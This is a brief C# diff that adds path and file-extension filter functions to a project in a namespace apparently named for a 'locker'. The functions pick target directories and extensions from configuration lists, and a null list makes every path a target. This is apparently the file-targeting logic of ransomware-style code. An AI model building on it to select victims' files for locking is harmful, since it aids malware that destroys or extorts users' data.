@@ -85,11 +85,29 @@ namespace s0s_L_ckr
 
         public static bool DireInFil(string fullNam)
         {
+            //Override vector, TargetT PATH FILTER variable to null.
+            if (ConfigMgr.TRGT_PTH_FLR == null)
+                return true;
+            String normPth = fullNam.ToUpper(CultureInfo.CurrentCulture);
+
+            foreach (String targetPath in ConfigMgr.TRGT_PTH_FLR)
+            {
+                if (normPth.Contains(targetPath))
+                    return true;
+            }
+            return false;
         }
 
         public static bool FileInFil(string fileExt)
         {
+            string normExt = fileExt.ToUpper(CultureInfo.CurrentCulture);
 
+            foreach (string targetFile in ConfigMgr.TRGT_FILS)
+            {
+                if (normExt == targetFile)
+                    return true;
+            }
+            return false;
         }
     }
 }
